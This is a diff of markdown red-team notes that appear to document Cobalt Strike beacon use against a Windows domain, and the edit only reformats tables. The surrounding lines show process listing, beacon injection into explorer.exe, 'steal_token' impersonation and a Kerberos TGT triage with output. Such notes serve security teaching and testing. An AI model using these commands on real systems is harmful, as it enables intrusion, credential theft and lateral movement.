@@ -99,9 +99,9 @@ If we inject the beacon into a process owned by a different user, the beacon wil
 ```
 beacon> ps
 
-PID   PPID  Name                         Arch  Session     User
----   ----  ----                         ----  -------     -----
-448   796   explorer.exe            x64   1           CORP\user
+PID   PPID  Name                   Arch  Session     User
+---   ----  ----                   ----  -------     -----
+448   796   explorer.exe            x64  1           CORP\user
 
 beacon> inject 448 x64 smb-p2p-payload
 [+] established link to child beacon: 10.10.10.10
@@ -120,9 +120,9 @@ The `steal_token` command will impersonate the access token of the target proces
 ```
 beacon> ps
 
-PID   PPID  Name                         Arch  Session     User
----   ----  ----                         ----  -------     -----
-448   796   explorer.exe            x64   1           CORP\user
+PID   PPID  Name                   Arch  Session     User
+---   ----  ----                   ----  -------     -----
+448   796   explorer.exe            x64  1           CORP\user
 
 beacon> steal_token 448
 [+] Impersonated CORP\user
@@ -239,12 +239,12 @@ Action: Triage Kerberos Tickets (All Users)
 
 [*] Current LUID    : 0x3e7
 
- ------------------------------------------------------------------------------------------------------------------ 
- | LUID    | UserName                     | Service                                       | EndTime               |
- ------------------------------------------------------------------------------------------------------------------ 
- | 0x462eb | user1 @ CORP.LOCAL    | krbtgt/CORP.LOCAL                      | 5/12/2021 12:34:03 AM |
- | 0x25ff6 | user2 @ CORP.LOCAL  | krbtgt/CORP.LOCAL                      | 5/12/2021 12:33:41 AM |
- ------------------------------------------------------------------------------------------------------------------
+ ----------------------------------------------------------------------------- 
+ | LUID    | UserName           | Service            | EndTime               |
+ -----------------------------------------------------------------------------
+ | 0x462eb | user1 @ CORP.LOCAL | krbtgt/CORP.LOCAL  | 5/12/2021 12:34:03 AM |
+ | 0x25ff6 | user2 @ CORP.LOCAL | krbtgt/CORP.LOCAL  | 5/12/2021 12:33:41 AM |
+ -----------------------------------------------------------------------------
 ```
 
 > *Note*: `krbtgt` service means that the ticket is a TGT.
